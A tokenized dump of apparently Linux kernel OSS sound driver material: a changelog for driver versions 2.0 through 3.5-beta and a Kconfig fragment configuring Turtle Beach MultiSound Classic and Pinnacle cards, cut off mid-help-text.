"to", "prompts", "Since", "3", ".", "5", "-", "beta6", "Fixed", "bugs", "in", "mmap", "(", ")", "support", ".", "Minor", "changes", "to", "Maui", "driver", ".", "Since", "3", ".", "5", "-", "beta5", "Fixed", "crash", "after", "recording", "with", "ESS688", ".", "It", "'", "s", "generally", "a", "good", "idea", "to", "stop", "inbound", "DMA", "transfers", "before", "freeing", "the", "memory", "buffer", ".", "Fixed", "handling", "of", "AD1845", "codec", "(", "for", "example", "Shuttle", "Sound", "System", ")", ".", "Few", "other", "fixes", ".", "Since", "3", ".", "5", "-", "beta4", "Fixed", "bug", "in", "handling", "of", "uninitialized", "instruments", "with", "GUS", ".", "Since", "3", ".", "5", "-", "beta3", "Few", "changes", "which", "decrease", "popping", "at", "end", "/", "beginning", "of", "audio", "playback", ".", "Since", "3", ".", "5", "-", "beta2", "Removed", "MAD16", "+", "CS4231", "hack", "made", "in", "previous", "version", "since", "it", "didn", "'", "t", "help", ".", "Fixed", "the", "above", "bug", "in", "proper", "way", "and", "in", "proper", "place", ".", "Many", "thanks", "to", "James", "Hightower", ".", "Since", "3", ".", "5", "-", "beta1", "Bug", "fixes", ".", "Full", "duplex", "audio", "with", "MAD16", "+", "CS4231", "may", "work", "now", ".", "The", "driver", "configures", "SB", "DMA", "of", "MAD16", "so", "that", "it", "doesn", "'", "t", "conflict", "with", "codec", "'", "s", "DMA", "channels", ".", "The", "side", "effect", "is", "that", "all", "8", "bit", "DMA", "channels", "(", "0", ",", "1", ",", "3", ")", "are", "populated", "in", "duplex", "mode", ".", "Since", "3", ".", "5", "-", "alpha9", "Bug", "fixes", "(", "mostly", "in", "Jazz16", "and", "ESS1688", "/", "688", "supports", ")", ".", "Temporarily", "disabled", "recording", "with", "ESS1688", "/", "688", "since", "it", "causes", "crash", ".", "Changed", "audio", "buffer", "partitioning", "algorithm", "so", "that", "it", "selects", "smaller", "fragment", "size", "than", "earlier", ".", "This", "improves", "real", "time", "capabilities", "of", "the", "driver", "and", "makes", "recording", "to", "disk", "to", "work", "better", ".", "Unfortunately", "this", "change", "breaks", "some", "programs", "which", "assume", "that", "fragments", "cannot", "be", "shorter", "than", "4096", "bytes", ".", "Since", "3", ".", "5", "-", "alpha8", "Bug", "fixes", "Since", "3", ".", "5", "-", "alpha7", "Linux", "kernel", "compatible", "configuration", "(", "_EXPERIMENTAL_", ")", ".", "Enable", "using", "command", "\"", "cd", "/", "linux", "/", "drivers", "/", "sound", ";", "make", "script", "\"", "and", "then", "just", "run", "kernel", "'", "s", "make", "config", "normally", ".", "Minor", "fixes", "to", "the", "SB", "support", ".", "Hopefully", "the", "driver", "works", "with", "all", "SB", "models", "now", ".", "Added", "support", "for", "ESS", "ES1688", "\"", "AudioDrive", "\"", "based", "cards", ".", "Since", "3", ".", "5", "-", "alpha6", "SB", "Pro", "and", "SB16", "supports", "are", "no", "longer", "separately", "selectable", "options", ".", "Enabling", "SB", "enables", "them", "too", ".", "Changed", "all", "#", "ifndef", "EXCLUDE_xx", "stuff", "to", "#", "ifdef", "CONFIG_xx", ".", "Modified", "configure", "to", "handle", "this", ".", "Removed", "initialization", "messages", "from", "the", "modularized", "version", ".", "They", "can", "be", "enabled", "by", "using", "init_trace", "=", "1", "in", "the", "insmod", "command", "line", "(", "insmod", "sound", "init_trace", "=", "1", ")", ".", "More", "AIX", "stuff", ".", "Added", "support", "for", "synchronizing", "dsp", "/", "audio", "devices", "with", "/", "dev", "/", "sequencer", ".", "mmap", "(", ")", "support", "for", "dsp", "/", "audio", "devices", ".", "Since", "3", ".", "5", "-", "alpha5", "AIX", "port", ".", "Changed", "some", "xxx_PATCH", "macros", "in", "soundcard", ".", "h", "to", "work", "with", "big", "endian", "machines", ".", "Since", "3", ".", "5", "-", "alpha4", "Removed", "the", "'", "setfx", "'", "stuff", "from", "the", "version", "distributed", "with", "kernel", "sources", ".", "Running", "'", "setfx", "'", "is", "required", "again", ".", "Since", "3", ".", "5", "-", "alpha3", "Moved", "stuff", "from", "the", "'", "setfx", "'", "program", "to", "the", "AudioTrix", "Pro", "driver", ".", "Since", "3", ".", "5", "-", "alpha2", "Modifications", "to", "makefile", "and", "configure", ".", "c", ".", "Unnecessary", "sources", "are", "no", "longer", "compiled", ".", "Newly", "created", "local", ".", "h", "is", "also", "copied", "to", "/", "etc", "/", "soundconf", ".", "\"", "make", "oldconfig", "\"", "reads", "/", "etc", "/", "soundconf", "and", "produces", "new", "local", ".", "h", "which", "is", "compatible", "with", "current", "version", "of", "the", "driver", ".", "Some", "fixes", "to", "the", "SB16", "support", ".", "Fixed", "random", "protection", "fault", "in", "gus_wave", ".", "c", "Since", "3", ".", "5", "-", "alpha1", "Modified", "to", "work", "with", "Linux", "-", "1", ".", "3", ".", "33", "and", "later", "Some", "minor", "changes", "Since", "3", ".", "0", ".", "2", "Support", "for", "CS4232", "based", "PnP", "cards", "(", "AcerMagic", "S23", "etc", ")", ".", "Full", "duplex", "support", "for", "some", "CS4231", ",", "CS4232", "and", "AD1845", "based", "cards", "(", "GUS", "MAX", ",", "AudioTrix", "Pro", ",", "AcerMagic", "S23", "and", "many", "MAD16", "/", "Mozart", "cards", "having", "a", "codec", "mentioned", "above", ")", ".", "Almost", "fully", "rewritten", "loadable", "modules", "support", ".", "Fixed", "some", "bugs", ".", "Huge", "amount", "of", "testing", "(", "more", "testing", "is", "still", "required", ")", ".", "mmap", "(", ")", "support", "(", "works", "with", "some", "cards", ")", ".", "Requires", "much", "more", "testing", ".", "Sample", "/", "patch", "/", "program", "loading", "for", "TB", "Maui", "/", "Tropez", ".", "No", "initialization", "since", "TB", "doesn", "'", "t", "allow", "me", "to", "release", "that", "code", ".", "Using", "CS4231", "compatible", "codecs", "as", "timer", "for", "/", "dev", "/", "music", ".", "Since", "3", ".", "0", ".", "1", "Added", "allocation", "of", "I", "/", "O", "ports", ",", "DMA", "channels", "and", "interrupts", "to", "the", "initialization", "code", ".", "This", "may", "break", "modules", "support", "since", "the", "driver", "may", "not", "free", "some", "resources", "on", "unload", ".", "Should", "be", "fixed", "soon", ".", "Since", "3", ".", "0", "Some", "important", "bug", "fixes", ".", "select", "(", ")", "for", "/", "dev", "/", "dsp", "and", "/", "dev", "/", "audio", "(", "Linux", "only", ")", ".", "(", "To", "use", "select", "(", ")", "with", "read", ",", "you", "have", "to", "call", "read", "(", ")", "to", "start", "the", "recording", ".", "Calling", "write", "(", ")", "kills", "recording", "immediately", "so", "use", "select", "(", ")", "carefully", "when", "you", "are", "writing", "a", "half", "duplex", "app", ".", "Full", "duplex", "mode", "is", "not", "implemented", "yet", ".", ")", "Select", "works", "also", "with", "/", "dev", "/", "sequencer", "and", "/", "dev", "/", "music", ".", "Maybe", "with", "/", "dev", "/", "midi", "#", "#", "too", ".", "Since", "3", ".", "0", "-", "beta2", "Minor", "fixes", ".", "Added", "Readme", ".", "cards", "Since", "3", ".", "0", "-", "beta1", "Minor", "fixes", "to", "the", "modules", "support", ".", "Eliminated", "call", "to", "sb_free_irq", "(", ")", "in", "ad1848", ".", "c", "Rewritten", "MAD16", "&", "Mozart", "support", "(", "not", "tested", "with", "MAD16", "Pro", ")", ".", "Fix", "to", "DMA", "initialization", "of", "PSS", "cards", ".", "Some", "fixes", "to", "ad1848", "/", "cs42xx", "mixer", "support", "(", "GUS", "MAX", ",", "MSS", ",", "etc", ".", ")", "Fixed", "some", "bugs", "in", "the", "PSS", "driver", "which", "caused", "I", "/", "O", "errors", "with", "the", "MSS", "mode", "(", "/", "dev", "/", "dsp", ")", ".", "Since", "3", ".", "0", "-", "950506", "Recording", "with", "GUS", "MAX", "fixed", ".", "It", "works", "when", "the", "driver", "is", "configured", "to", "use", "two", "DMA", "channels", "with", "GUS", "MAX", "(", "16", "bit", "ones", "recommended", ")", ".", "Since", "3", ".", "0", "-", "94xxxx", "Too", "many", "changes", "Since", "3", ".", "0", "-", "940818", "Fixes", "for", "Linux", "1", ".", "1", ".", "4x", ".", "Disables", "Disney", "Sound", "System", "with", "SG", "NX", "Pro", "16", "(", "less", "noise", ")", ".", "Since", "2", ".", "90", "-", "2", "Fixes", "to", "soundcard", ".", "h", "Non", "blocking", "mode", "to", "/", "dev", "/", "sequencer", "Experimental", "detection", "code", "for", "Ensoniq", "Soundscape", ".", "Since", "2", ".", "90", "Minor", "and", "major", "bug", "fixes", "Since", "pre", "-", "3", ".", "0", "-", "940712", "GUS", "MAX", "support", "Partially", "working", "MSS", "/", "WSS", "support", "(", "could", "work", "with", "some", "cards", ")", ".", "Hardware", "u", "-", "Law", "and", "A", "-", "Law", "support", "with", "AD1848", "/", "CS4248", "and", "CS4231", "codecs", "(", "GUS", "MAX", ",", "GUS16", ",", "WSS", "etc", ")", ".", "Hardware", "ADPCM", "is", "possible", "with", "GUS16", "and", "GUS", "MAX", ",", "but", "it", "doesn", "'", "t", "work", "yet", ".", "Since", "pre", "-", "3", ".", "0", "-", "940426", "AD1848", "/", "CS4248", "/", "CS4231", "codec", "support", "(", "MSS", ",", "GUS", "MAX", ",", "Aztec", ",", "Orchid", "etc", ")", ".", "This", "codec", "chip", "is", "used", "in", "various", "sound", "cards", ".", "This", "version", "is", "developed", "for", "the", "16", "bit", "daughtercard", "of", "GUS", ".", "It", "should", "work", "with", "other", "cards", "also", "if", "the", "following", "requirements", "are", "met", ":", "-", "The", "I", "/", "O", ",", "IRQ", "and", "DMA", "settings", "are", "jumper", "selectable", "or", "the", "card", "is", "initialized", "by", "booting", "DOS", "before", "booting", "Linux", "(", "etc", ".", ").", "-", "You", "add", "the", "IO", ",", "IRQ", "and", "DMA", "settings", "manually", "to", "the", "local", ".", "h", ".", "(", "Just", "define", "GUS16_BASE", ",", "GUS16_IRQ", "and", "GUS16_DMA", ")", ".", "Note", "that", "the", "base", "address", "bust", "be", "the", "base", "address", "of", "the", "codec", "chip", "not", "the", "card", "itself", ".", "For", "the", "GUS16", "these", "are", "the", "same", "but", "most", "MSS", "compatible", "cards", "have", "the", "codec", "located", "at", "card_base", "+", "4", ".", "Some", "minor", "changes", "Since", "2", ".", "5", "(", "**", "**", "**", "*", "MAJOR", "REWRITE", "*", "**", "**", "**", "**", "**", ")", "This", "version", "is", "based", "on", "v2", ".", "3", ".", "I", "have", "tried", "to", "maintain", "two", "versions", "together", "so", "that", "this", "one", "should", "have", "the", "same", "features", "than", "v2", ".", "5", ".", "Something", "may", "still", "be", "missing", ".", "If", "you", "notice", "such", "things", ",", "please", "let", "me", "know", ".", "The", "Readme", ".", "v30", "contains", "more", "details", ".", "/", "dev", "/", "midi", "#", "#", "devices", ".", "/", "dev", "/", "sequencer2", "Since", "2", ".", "5", "-", "beta2", "Some", "fine", "tuning", "to", "the", "GUS", "v3", ".", "7", "mixer", "code", ".", "Fixed", "speed", "limits", "for", "the", "plain", "SB", "(", "1", ".", "0", "to", "2", ".", "0", ")", ".", "Since", "2", ".", "5", "-", "beta", "Fixed", "OPL", "-", "3", "detection", "with", "SB", ".", "Caused", "problems", "with", "PAS16", ".", "GUS", "v3", ".", "7", "mixer", "support", ".", "Since", "2", ".", "4", "Mixer", "support", "for", "Sound", "Galaxy", "NX", "Pro", "(", "define", "__SGNXPRO__", "on", "your", "local", ".", "h", ")", ".", "Fixed", "truncated", "sound", "on", "/", "dev", "/", "dsp", "when", "the", "device", "is", "closed", ".", "Linear", "volume", "mode", "for", "GUS", "Pitch", "bends", "larger", "than", "+", "/-", "2", "octaves", ".", "MIDI", "recording", "for", "SB", "and", "SB", "Pro", ".", "(", "Untested", ")", ".", "Some", "other", "fixes", ".", "SB16", "MIDI", "and", "DSP", "drivers", "only", "initialized", "if", "SB16", "actually", "installed", ".", "Implemented", "better", "detection", "for", "OPL", "-", "3", ".", "This", "should", "be", "useful", "if", "you", "have", "an", "old", "SB", "Pro", "(", "the", "non", "-", "OPL", "-", "3", "one", ")", "or", "a", "SB", "2", ".", "0", "clone", "which", "has", "a", "OPL", "-", "3", ".", "SVR4", ".", "2", "support", "by", "Ian", "Hartas", ".", "Initial", "ALPHA", "TEST", "version", "(", "untested", ")", ".", "Since", "2", ".", "3b", "Fixed", "bug", "which", "made", "it", "impossible", "to", "make", "long", "recordings", "to", "disk", ".", "Recording", "was", "not", "restarted", "after", "a", "buffer", "overflow", "situation", ".", "Limited", "mixer", "support", "for", "GUS", ".", "Numerous", "improvements", "to", "the", "GUS", "driver", "by", "Andrew", "Robinson", ".", "Including", "some", "click", "removal", "etc", ".", "Since", "2", ".", "3", "Fixed", "some", "minor", "bugs", "in", "the", "SB16", "driver", ".", "Since", "2", ".", "2b", "Full", "SB16", "DSP", "support", ".", "8", "/", "16", "bit", ",", "mono", "/", "stereo", "The", "SCO", "and", "FreeBSD", "versions", "should", "be", "in", "sync", "now", ".", "There", "are", "some", "problems", "with", "SB16", "and", "GUS", "in", "the", "FreeBSD", "versions", ".", "The", "DMA", "buffer", "allocation", "of", "the", "SCO", "version", "has", "been", "polished", "but", "there", "could", "still", "be", "some", "problems", ".", "At", "least", "it", "hogs", "memory", ".", "The", "DMA", "channel", "configuration", "method", "used", "in", "the", "SCO", "/", "System", "is", "a", "hack", ".", "Support", "for", "the", "MPU", "emulation", "of", "the", "SB16", ".", "Some", "big", "arrays", "are", "now", "allocated", "boot", "time", ".", "This", "makes", "the", "BSS", "segment", "smaller", "which", "makes", "it", "possible", "to", "use", "the", "full", "driver", "with", "NetBSD", ".", "These", "arrays", "are", "not", "allocated", "if", "no", "suitable", "sound", "card", "is", "available", ".", "Fixed", "a", "bug", "in", "the", "compute_and_set_volume", "in", "gus_wave", ".", "c", "Fixed", "the", "too", "fast", "mono", "playback", "problem", "of", "SB", "Pro", "and", "PAS16", ".", "Since", "2", ".", "2", "Stereo", "recording", "for", "SB", "Pro", ".", "Somehow", "it", "was", "missing", "and", "nobody", "had", "noticed", "it", "earlier", ".", "Minor", "polishing", ".", "Interpreting", "of", "boot", "time", "arguments", "(", "sound", "=", ")", "for", "Linux", ".", "Breakup", "of", "sb_dsp", ".", "c", ".", "Parts", "of", "the", "code", "has", "been", "moved", "to", "sb_mixer", ".", "c", "and", "sb_midi", ".", "c", "Since", "2", ".", "1", "Preliminary", "support", "for", "SB16", ".", "-", "The", "SB16", "mixer", "is", "supported", "in", "its", "native", "mode", ".", "-", "Digitized", "voice", "capability", "up", "to", "44", ".", "1", "kHz", "/", "8", "bit", "/", "mono", "(", "16", "bit", "and", "stereo", "support", "coming", "in", "the", "next", "release", ")", ".", "Fixed", "some", "bugs", "in", "the", "digitized", "voice", "driver", "for", "PAS16", ".", "Proper", "initialization", "of", "the", "SB", "emulation", "of", "latest", "PAS16", "models", ".", "Significantly", "improved", "/", "dev", "/", "dsp", "and", "/", "dev", "/", "audio", "support", ".", "-", "Now", "supports", "half", "duplex", "mode", ".", "It", "'", "s", "now", "possible", "to", "record", "and", "playback", "without", "closing", "and", "reopening", "the", "device", ".", "-", "It", "'", "s", "possible", "to", "use", "smaller", "buffers", "than", "earlier", ".", "There", "is", "a", "new", "ioctl", "(", "fd", ",", "SNDCTL_DSP_SUBDIVIDE", ",", "&", "n", ")", "where", "n", "should", "be", "1", ",", "2", "or", "4", ".", "This", "call", "instructs", "the", "driver", "to", "use", "smaller", "buffers", ".", "The", "default", "buffer", "size", "(", "0", ".", "5", "to", "1", ".", "0", "seconds", ")", "is", "divided", "by", "n", ".", "Should", "be", "called", "immediately", "after", "opening", "the", "device", ".", "Since", "2", ".", "0", "Just", "cosmetic", "changes", ".", "@", "@", "-", "1", ",", "533", "+", "0", ",", "0", "@", "@", "#", "18", "Apr", "1998", ",", "Michael", "Elizabeth", "Chastain", ",", "<", "mailto", ":", "mec", "@", "shout", ".", "net", ">", "#", "More", "hacking", "for", "modularisation", ".", "#", "#", "Prompt", "user", "for", "primary", "drivers", ".", "config", "SOUND_BCM_CS4297A", "tristate", "\"", "Crystal", "Sound", "CS4297a", "(", "for", "Swarm", ")", "\"", "depends", "on", "SIBYTE_SWARM", "help", "The", "BCM91250A", "has", "a", "Crystal", "CS4297a", "on", "synchronous", "serial", "port", "B", "(", "in", "addition", "to", "the", "DB", "-", "9", "serial", "port", ")", ".", "Say", "Y", "or", "M", "here", "to", "enable", "the", "sound", "chip", "instead", "of", "the", "UART", ".", "Also", "note", "that", "CONFIG_KGDB", "should", "not", "be", "enabled", "at", "the", "same", "time", ",", "since", "it", "also", "attempts", "to", "use", "this", "UART", "port", ".", "config", "SOUND_MSNDCLAS", "tristate", "\"", "Support", "for", "Turtle", "Beach", "MultiSound", "Classic", ",", "Tahiti", ",", "Monterey", "\"", "depends", "on", "(", "m", "|", "|", "!", "STANDALONE", ")", "&", "&", "ISA", "help", "Say", "M", "here", "if", "you", "have", "a", "Turtle", "Beach", "MultiSound", "Classic", ",", "Tahiti", "or", "Monterey", "(", "not", "for", "the", "Pinnacle", "or", "Fiji", ")", ".", "See", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "MultiSound", ">", "for", "important", "information", "about", "this", "driver", ".", "Note", "that", "it", "has", "been", "discontinued", ",", "but", "the", "Voyetra", "Turtle", "Beach", "knowledge", "base", "entry", "for", "it", "is", "still", "available", "at", "<", "http", ":", "//", "www", ".", "turtlebeach", ".", "com", "/", "site", "/", "kb_ftp", "/", "790", ".", "asp", ">", ".", "comment", "\"", "Compiled", "-", "in", "MSND", "Classic", "support", "requires", "firmware", "during", "compilation", ".", "\"", "depends", "on", "SOUND_PRIME", "&", "&", "SOUND_MSNDCLAS", "=", "y", "config", "MSNDCLAS_HAVE_BOOT", "bool", "depends", "on", "SOUND_MSNDCLAS", "=", "y", "&", "&", "!", "STANDALONE", "default", "y", "config", "MSNDCLAS_INIT_FILE", "string", "\"", "Full", "pathname", "of", "MSNDINIT", ".", "BIN", "firmware", "file", "\"", "depends", "on", "SOUND_MSNDCLAS", "default", "\"", "/", "etc", "/", "sound", "/", "msndinit", ".", "bin", "\"", "help", "The", "MultiSound", "cards", "have", "two", "firmware", "files", "which", "are", "required", "for", "operation", ",", "and", "are", "not", "currently", "included", ".", "These", "files", "can", "be", "obtained", "from", "Turtle", "Beach", ".", "See", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "MultiSound", ">", "for", "information", "on", "how", "to", "obtain", "this", ".", "config", "MSNDCLAS_PERM_FILE", "string", "\"", "Full", "pathname", "of", "MSNDPERM", ".", "BIN", "firmware", "file", "\"", "depends", "on", "SOUND_MSNDCLAS", "default", "\"", "/", "etc", "/", "sound", "/", "msndperm", ".", "bin", "\"", "help", "The", "MultiSound", "cards", "have", "two", "firmware", "files", "which", "are", "required", "for", "operation", ",", "and", "are", "not", "currently", "included", ".", "These", "files", "can", "be", "obtained", "from", "Turtle", "Beach", ".", "See", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "MultiSound", ">", "for", "information", "on", "how", "to", "obtain", "this", ".", "config", "MSNDCLAS_IRQ", "int", "\"", "MSND", "Classic", "IRQ", "5", ",", "7", ",", "9", ",", "10", ",", "11", ",", "12", "\"", "depends", "on", "SOUND_MSNDCLAS", "=", "y", "default", "\"", "5", "\"", "help", "Interrupt", "Request", "line", "for", "the", "MultiSound", "Classic", "and", "related", "cards", ".", "config", "MSNDCLAS_MEM", "hex", "\"", "MSND", "Classic", "memory", "B0000", ",", "C8000", ",", "D0000", ",", "D8000", ",", "E0000", ",", "E8000", "\"", "depends", "on", "SOUND_MSNDCLAS", "=", "y", "default", "\"", "D0000", "\"", "help", "Memory", "-", "mapped", "I", "/", "O", "base", "address", "for", "the", "MultiSound", "Classic", "and", "related", "cards", ".", "config", "MSNDCLAS_IO", "hex", "\"", "MSND", "Classic", "I", "/", "O", "210", ",", "220", ",", "230", ",", "240", ",", "250", ",", "260", ",", "290", ",", "3E0", "\"", "depends", "on", "SOUND_MSNDCLAS", "=", "y", "default", "\"", "290", "\"", "help", "I", "/", "O", "port", "address", "for", "the", "MultiSound", "Classic", "and", "related", "cards", ".", "config", "SOUND_MSNDPIN", "tristate", "\"", "Support", "for", "Turtle", "Beach", "MultiSound", "Pinnacle", ",", "Fiji", "\"", "depends", "on", "(", "m", "|", "|", "!", "STANDALONE", ")", "&", "&", "ISA", "help", "Say", "M", "here", "if", "you", "have", "a", "Turtle", "Beach", "MultiSound", "Pinnacle", "or", "Fiji", ".", "See", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "MultiSound", ">", "for", "important", "information", "about", "this", "driver", ".", "Note", "that", "it", "has", "been", "discontinued", ",", "but", "the", "Voyetra", "Turtle", "Beach", "knowledge", "base", "entry", "for", "it", "is", "still", "available", "at", "<", "http", ":", "//", "www", ".", "turtlebeach", ".", "com", "/", "site", "/", "kb_ftp", "/", "600", ".", "asp", ">", ".", "comment", "\"", "Compiled", "-", "in", "MSND", "Pinnacle", "support", "requires", "firmware", "during", "compilation", ".", "\"", "depends", "on", "SOUND_PRIME", "&", "&", "SOUND_MSNDPIN", "=", "y", "config", "MSNDPIN_HAVE_BOOT", "bool", "depends", "on", "SOUND_MSNDPIN", "=", "y", "default", "y", "config", "MSNDPIN_INIT_FILE", "string", "\"", "Full", "pathname", "of", "PNDSPINI", ".", "BIN", "firmware", "file", "\"", "depends", "on", "SOUND_MSNDPIN", "default", "\"", "/", "etc", "/", "sound", "/", "pndspini", ".", "bin", "\"", "help", "The", "MultiSound", "cards", "have", "two", "firmware", "files", "which", "are", "required", "for", "operation", ",", "and", "are", "not", "currently", "included", ".", "These", "files", "can", "be", "obtained", "from", "Turtle", "Beach", ".", "See", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "MultiSound", ">", "for", "information", "on", "how", "to", "obtain", "this", ".", "config", "MSNDPIN_PERM_FILE", "string", "\"", "Full", "pathname", "of", "PNDSPERM", ".", "BIN", "firmware", "file", "\"", "depends", "on", "SOUND_MSNDPIN", "default", "\"", "/", "etc", "/", "sound", "/", "pndsperm", ".", "bin", "\"", "help", "The", "MultiSound", "cards", "have", "two", "firmware", "files", "which", "are", "required", "for", "operation", ",", "and", "are", "not", "currently", "included", ".", "These", "files", "can", "be", "obtained", "from", "Turtle", "Beach", ".", "See", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "MultiSound", ">", "for", "information", "on", "how", "to", "obtain", "this", ".", "config", "MSNDPIN_IRQ", "int", "\"", "MSND", "Pinnacle", "IRQ", "5", ",", "7", ",", "9", ",", "10", ",", "11", ",", "12", "\"", "depends", "on", "SOUND_MSNDPIN", "=", "y", "default", "\"", "5", "\"", "help", "Interrupt", "request", "line", "for", "the", "primary", "synthesizer", "on", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSNDPIN_MEM", "hex", "\"", "MSND", "Pinnacle", "memory", "B0000", ",", "C8000", ",", "D0000", ",", "D8000", ",", "E0000", ",", "E8000", "\"", "depends", "on", "SOUND_MSNDPIN", "=", "y", "default", "\"", "D0000", "\"", "help", "Memory", "-", "mapped", "I", "/", "O", "base", "address", "for", "the", "primary", "synthesizer", "on", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSNDPIN_IO", "hex", "\"", "MSND", "Pinnacle", "I", "/", "O", "210", ",", "220", ",", "230", ",", "240", ",", "250", ",", "260", ",", "290", ",", "3E0", "\"", "depends", "on", "SOUND_MSNDPIN", "=", "y", "default", "\"", "290", "\"", "help", "Memory", "-", "mapped", "I", "/", "O", "base", "address", "for", "the", "primary", "synthesizer", "on", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSNDPIN_DIGITAL", "bool", "\"", "MSND", "Pinnacle", "has", "S", "/", "PDIF", "I", "/", "O", "\"", "depends", "on", "SOUND_MSNDPIN", "=", "y", "help", "If", "you", "have", "the", "S", "/", "PDIF", "daughter", "board", "for", "the", "Pinnacle", "or", "Fiji", ",", "answer", "Y", "here", ";", "otherwise", ",", "say", "N", ".", "If", "you", "have", "this", ",", "you", "will", "be", "able", "to", "play", "and", "record", "from", "the", "S", "/", "PDIF", "port", "(", "digital", "signal", ")", ".", "See", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "MultiSound", ">", "for", "information", "on", "how", "to", "make", "use", "of", "this", "capability", ".", "config", "MSNDPIN_NONPNP", "bool", "\"", "MSND", "Pinnacle", "non", "-", "PnP", "Mode", "\"", "depends", "on", "SOUND_MSNDPIN", "=", "y", "help", "The", "Pinnacle", "and", "Fiji", "card", "resources", "can", "be", "configured", "either", "with", "PnP", ",", "or", "through", "a", "configuration", "port", ".", "Say", "Y", "here", "if", "your", "card", "is", "NOT", "in", "PnP", "mode", ".", "For", "the", "Pinnacle", ",", "configuration", "in", "non", "-", "PnP", "mode", "allows", "use", "of", "the", "IDE", "and", "joystick", "peripherals", "on", "the", "card", "as", "well", ";", "these", "do", "not", "show", "up", "when", "the", "card", "is", "in", "PnP", "mode", ".", "Specifying", "zero", "for", "any", "resource", "of", "a", "device", "will", "disable", "the", "device", ".", "If", "you", "are", "running", "the", "card", "in", "PnP", "mode", ",", "you", "must", "say", "N", "here", "and", "use", "isapnptools", "to", "configure", "the", "card", "'", "s", "resources", ".", "comment", "\"", "MSND", "Pinnacle", "DSP", "section", "will", "be", "configured", "to", "above", "parameters", ".", "\"", "depends", "on", "SOUND_MSNDPIN", "=", "y", "&", "&", "MSNDPIN_NONPNP", "config", "MSNDPIN_CFG", "hex", "\"", "MSND", "Pinnacle", "config", "port", "250", ",", "260", ",", "270", "\"", "depends", "on", "MSNDPIN_NONPNP", "default", "\"", "250", "\"", "help", "This", "is", "the", "port", "which", "the", "Pinnacle", "and", "Fiji", "uses", "to", "configure", "the", "card", "'", "s", "resources", "when", "not", "in", "PnP", "mode", ".", "If", "your", "card", "is", "in", "PnP", "mode", ",", "then", "be", "sure", "to", "say", "N", "to", "the", "previous", "option", ",", "\"", "MSND", "Pinnacle", "Non", "-", "PnP", "Mode", "\"", ".", "comment", "\"", "Pinnacle", "-", "specific", "Device", "Configuration", "(", "0", "disables", ")", "\"", "depends", "on", "SOUND_MSNDPIN", "=", "y", "&", "&", "MSNDPIN_NONPNP", "config", "MSNDPIN_MPU_IO", "hex", "\"", "MSND", "Pinnacle", "MPU", "I", "/", "O", "(", "e", ".", "g", ".", "330", ")", "\"", "depends", "on", "MSNDPIN_NONPNP", "default", "\"", "0", "\"", "help", "Memory", "-", "mapped", "I", "/", "O", "base", "address", "for", "the", "Kurzweil", "daughterboard", "synthesizer", "on", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSNDPIN_MPU_IRQ", "int", "\"", "MSND", "Pinnacle", "MPU", "IRQ", "(", "e", ".", "g", ".", "9", ")", "\"", "depends", "on", "MSNDPIN_NONPNP", "default", "\"", "0", "\"", "help", "Interrupt", "request", "number", "for", "the", "Kurzweil", "daughterboard", "synthesizer", "on", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSNDPIN_IDE_IO0", "hex", "\"", "MSND", "Pinnacle", "IDE", "I", "/", "O", "0", "(", "e", ".", "g", ".", "170", ")", "\"", "depends", "on", "MSNDPIN_NONPNP", "default", "\"", "0", "\"", "help", "CD", "-", "ROM", "drive", "0", "memory", "-", "mapped", "I", "/", "O", "base", "address", "for", "the", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSNDPIN_IDE_IO1", "hex", "\"", "MSND", "Pinnacle", "IDE", "I", "/", "O", "1", "(", "e", ".", "g", ".", "376", ")", "\"", "depends", "on", "MSNDPIN_NONPNP", "default", "\"", "0", "\"", "help", "CD", "-", "ROM", "drive", "1", "memory", "-", "mapped", "I", "/", "O", "base", "address", "for", "the", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSNDPIN_IDE_IRQ", "int", "\"", "MSND", "Pinnacle", "IDE", "IRQ", "(", "e", ".", "g", ".", "15", ")", "\"", "depends", "on", "MSNDPIN_NONPNP", "default", "\"", "0", "\"", "help", "Interrupt", "request", "number", "for", "the", "IDE", "CD", "-", "ROM", "interface", "on", "the", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSNDPIN_JOYSTICK_IO", "hex", "\"", "MSND", "Pinnacle", "joystick", "I", "/", "O", "(", "e", ".", "g", ".", "200", ")", "\"", "depends", "on", "MSNDPIN_NONPNP", "default", "\"", "0", "\"", "help", "Memory", "-", "mapped", "I", "/", "O", "base", "address", "for", "the", "joystick", "port", "on", "MultiSound", "Pinnacle", "and", "Fiji", "sound", "cards", ".", "config", "MSND_FIFOSIZE", "int", "\"", "MSND", "buffer", "size", "(", "kB", ")", "\"", "depends", "on", "SOUND_MSNDPIN", "=", "y", "|", "|", "SOUND_MSNDCLAS", "=", "y", "default", "\"", "128", "\"", "help", "Configures", "the", "size", "of", "each", "audio", "buffer", ",", "in", "kilobytes", ",", "for", "recording", "and", "playing", "in", "the", "MultiSound", "drivers", "(", "both", "the", "Classic", "and", "Pinnacle", ")", ".", "Larger", "values", "reduce", "the", "chance", "of", "data", "overruns", "at", "the", "expense", "of", "overall", "latency", ".", "If", "unsure", ",", "use", "the", "default", ".", "menuconfig", "SOUND_OSS", "tristate", "\"", "OSS", "sound", "modules", "\"", "depends", "on", "ISA_DMA_API", "&", "&", "(", "VIRT_TO_BUS", "|", "|", "ARCH_RPC", "|", "|", "ARCH_NETWINDER", ")", "depends", "on", "!", "GENERIC_ISA_DMA_SUPPORT_BROKEN", "help", "OSS", "is", "the", "Open", "Sound", "System", "suite", "of", "sound", "card", "drivers", ".", "They", "make", "sound", "programming", "easier", "since", "they", "provide", "a", "common", "API", ".", "Say", "Y", "or", "M", "here", "(", "the", "module", "will", "be", "called", "sound", ")", "if", "you", "haven", "'", "t", "found", "a", "driver", "for", 